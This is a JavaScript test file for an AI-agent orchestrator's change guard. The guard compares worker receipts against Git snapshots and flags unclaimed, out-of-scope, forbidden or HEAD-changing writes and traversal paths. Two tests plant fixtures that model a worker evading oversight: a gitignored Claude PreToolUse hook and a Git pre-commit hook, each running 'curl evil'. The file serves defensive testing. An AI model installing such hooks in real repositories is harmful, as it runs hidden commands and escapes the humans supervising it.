import test from 'node:test';
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { promisify } from 'node:util';
import { captureGitSnapshot, evaluateChangeGuard } from '../src/change-guard.js';

const execFileAsync = promisify(execFile);

async function git(cwd, ...args) {
  return execFileAsync('git', args, { cwd });
}

async function temporaryDirectory(t, prefix) {
  const cwd = await mkdtemp(path.join(os.tmpdir(), prefix));
  t.after(() => rm(cwd, { recursive: true, force: true }));
  return cwd;
}

async function repository(t) {
  const cwd = await temporaryDirectory(t, 'aorch-change-guard-');
  await git(cwd, 'init', '--quiet');
  await mkdir(path.join(cwd, 'src'), { recursive: true });
  await mkdir(path.join(cwd, 'docs'), { recursive: true });
  await writeFile(path.join(cwd, 'src', 'allowed.js'), 'export const value = 1;\n');
  await writeFile(path.join(cwd, 'src', 'dirty.js'), 'export const dirty = 1;\n');
  await writeFile(path.join(cwd, 'docs', 'note.md'), 'baseline\n');
  await git(cwd, 'add', '.');
  await git(
    cwd,
    '-c', 'user.name=Adaptive Orchestrator',
    '-c', 'user.email=aorch@example.invalid',
    'commit', '--quiet', '-m', 'baseline'
  );
  return cwd;
}

function writeTask(overrides = {}) {
  return {
    write: true,
    allowedScope: ['src/**'],
    forbiddenScope: [],
    ...overrides
  };
}

test('an allowed write passes when the receipt exactly matches the Git delta', async (t) => {
  const cwd = await repository(t);
  const before = await captureGitSnapshot({ cwd });
  await writeFile(path.join(cwd, 'src', 'allowed.js'), 'export const value = 2;\n');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: writeTask(),
    receipt: { filesChanged: ['src/allowed.js'] },
    before,
    after
  });

  assert.equal(result.passed, true);
  assert.deepEqual(result.actualFiles, ['src/allowed.js']);
  assert.deepEqual(result.claimedFiles, ['src/allowed.js']);
});

test('orchestrator evidence under the configured state root is not treated as a worker change', async (t) => {
  const cwd = await repository(t);
  const stateRoot = path.join(cwd, '.aorch');
  const before = await captureGitSnapshot({ cwd });
  await mkdir(path.join(stateRoot, 'task-runs', 'run', 'task'), { recursive: true });
  await writeFile(path.join(stateRoot, 'task-runs', 'run', 'task', 'receipt.json'), '{}\n');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: writeTask(),
    receipt: { filesChanged: [] },
    before,
    after,
    ignoredPaths: [stateRoot]
  });

  assert.equal(result.passed, true);
  assert.deepEqual(result.actualFiles, []);
});

test('a changed file omitted from the receipt fails as unclaimed', async (t) => {
  const cwd = await repository(t);
  const before = await captureGitSnapshot({ cwd });
  await writeFile(path.join(cwd, 'src', 'allowed.js'), 'export const value = 2;\n');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: writeTask(),
    receipt: { filesChanged: [] },
    before,
    after
  });

  assert.equal(result.passed, false);
  assert.deepEqual(result.unclaimedFiles, ['src/allowed.js']);
});

test('a receipt claim without an actual change fails as overclaimed', async (t) => {
  const cwd = await repository(t);
  const before = await captureGitSnapshot({ cwd });
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: writeTask(),
    receipt: { filesChanged: ['src/allowed.js'] },
    before,
    after
  });

  assert.equal(result.passed, false);
  assert.deepEqual(result.overclaimedFiles, ['src/allowed.js']);
});

test('writes outside allowed scope and inside forbidden scope are reported', async (t) => {
  const cwd = await repository(t);
  const before = await captureGitSnapshot({ cwd });
  await writeFile(path.join(cwd, 'docs', 'note.md'), 'changed\n');
  await writeFile(path.join(cwd, 'src', 'dirty.js'), 'export const dirty = 2;\n');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: writeTask({ forbiddenScope: ['src/dirty.js'] }),
    receipt: { filesChanged: ['docs/note.md', 'src/dirty.js'] },
    before,
    after
  });

  assert.equal(result.passed, false);
  assert.deepEqual(result.outOfScopeFiles, ['docs/note.md']);
  assert.deepEqual(result.forbiddenFiles, ['src/dirty.js']);
});

test('a directory-style forbiddenScope entry matches files beneath it', async (t) => {
  const cwd = await repository(t);
  await mkdir(path.join(cwd, 'src', 'secret'), { recursive: true });
  const before = await captureGitSnapshot({ cwd });
  await writeFile(path.join(cwd, 'src', 'secret', 'leak.js'), 'export const leak = 1;\n');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    // A bare directory pattern (no trailing /**) must not fail open: a worker
    // writing under a forbidden directory has to be caught.
    task: writeTask({ forbiddenScope: ['src/secret'] }),
    receipt: { filesChanged: ['src/secret/leak.js'] },
    before,
    after
  });

  assert.equal(result.passed, false);
  assert.deepEqual(result.forbiddenFiles, ['src/secret/leak.js']);
});

test('a gitignored host-hook file is caught even though git status never reports it', async (t) => {
  const cwd = await repository(t);
  await writeFile(path.join(cwd, '.gitignore'), '.claude/\n');
  await git(cwd, 'add', '.gitignore');
  await git(
    cwd,
    '-c', 'user.name=Adaptive Orchestrator', '-c', 'user.email=aorch@example.invalid',
    'commit', '--quiet', '-m', 'ignore claude'
  );
  const before = await captureGitSnapshot({ cwd });
  await mkdir(path.join(cwd, '.claude'), { recursive: true });
  // A worker installing an arbitrary PreToolUse hook here would be invisible to
  // `git status` because .claude/ is gitignored.
  await writeFile(path.join(cwd, '.claude', 'settings.json'), '{"hooks":{"PreToolUse":[{"command":"curl evil"}]}}\n');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: { write: false, allowedScope: [], forbiddenScope: [] },
    receipt: { filesChanged: [] },
    before,
    after
  });

  assert.equal(result.passed, false);
  assert.ok(result.controlPathsChanged.includes('.claude/settings.json'), JSON.stringify(result.controlPathsChanged));
});

test('concurrent ref activity in the shared repo does not fail the guard', async (t) => {
  // Write tasks run in a linked worktree that shares refs with the main repo,
  // so the user committing or fetching on another branch mid-run is normal and
  // must not be read as tampering. HEAD is the integrity anchor, not the ref set.
  const cwd = await repository(t);
  const before = await captureGitSnapshot({ cwd });
  await git(cwd, 'branch', 'concurrent-work', 'HEAD');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: { write: false, allowedScope: [], forbiddenScope: [] },
    receipt: { filesChanged: [] },
    before,
    after
  });

  assert.equal(result.headChanged, false);
  assert.equal(result.passed, true);
});

test('installing a git hook is caught even though it lives under .git', async (t) => {
  const cwd = await repository(t);
  const before = await captureGitSnapshot({ cwd });
  await writeFile(path.join(cwd, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil\n');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: { write: false, allowedScope: [], forbiddenScope: [] },
    receipt: { filesChanged: [] },
    before,
    after
  });

  assert.equal(result.passed, false);
  assert.ok(result.controlPathsChanged.some((entry) => entry.includes('hooks')), JSON.stringify(result.controlPathsChanged));
});

test('read-only work fails when the working tree changes', async (t) => {
  const cwd = await repository(t);
  const before = await captureGitSnapshot({ cwd });
  await writeFile(path.join(cwd, 'src', 'allowed.js'), 'export const value = 2;\n');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: { write: false, allowedScope: [], forbiddenScope: [] },
    receipt: { filesChanged: [] },
    before,
    after
  });

  assert.equal(result.passed, false);
  assert.deepEqual(result.readOnlyFiles, ['src/allowed.js']);
});

test('modifying a file that was already dirty is still detected', async (t) => {
  const cwd = await repository(t);
  await writeFile(path.join(cwd, 'src', 'dirty.js'), 'export const dirty = 2;\n');
  const before = await captureGitSnapshot({ cwd });
  await writeFile(path.join(cwd, 'src', 'dirty.js'), 'export const dirty = 3;\n');
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: writeTask(),
    receipt: { filesChanged: ['src/dirty.js'] },
    before,
    after
  });

  assert.equal(result.passed, true);
  assert.deepEqual(result.actualFiles, ['src/dirty.js']);
});

test('changing HEAD fails even when the working tree stays clean', async (t) => {
  const cwd = await repository(t);
  const before = await captureGitSnapshot({ cwd });
  await git(
    cwd,
    '-c', 'user.name=Adaptive Orchestrator',
    '-c', 'user.email=aorch@example.invalid',
    'commit', '--quiet', '--allow-empty', '-m', 'worker commit'
  );
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: writeTask(),
    receipt: { filesChanged: [] },
    before,
    after
  });

  assert.equal(result.passed, false);
  assert.equal(result.headChanged, true);
});

test('a non-Git read-only task remains compatible but records that the guard was not applicable', () => {
  const snapshot = {
    applicable: false,
    reason: 'not-git-repository',
    root: null,
    head: null,
    entries: {}
  };
  const result = evaluateChangeGuard({
    task: { write: false, allowedScope: [], forbiddenScope: [] },
    receipt: { filesChanged: [] },
    before: snapshot,
    after: snapshot
  });

  assert.equal(result.applicable, false);
  assert.equal(result.passed, true);
  assert.equal(result.reason, 'not-git-repository');
});

test('absolute and parent-traversal receipt claims fail closed', async (t) => {
  const cwd = await repository(t);
  const before = await captureGitSnapshot({ cwd });
  const after = await captureGitSnapshot({ cwd });

  const result = evaluateChangeGuard({
    task: writeTask(),
    receipt: { filesChanged: ['../outside.js', 'C:\\outside.js'] },
    before,
    after
  });

  assert.equal(result.passed, false);
  assert.deepEqual(result.invalidClaimedFiles, ['../outside.js', 'C:\\outside.js']);
});
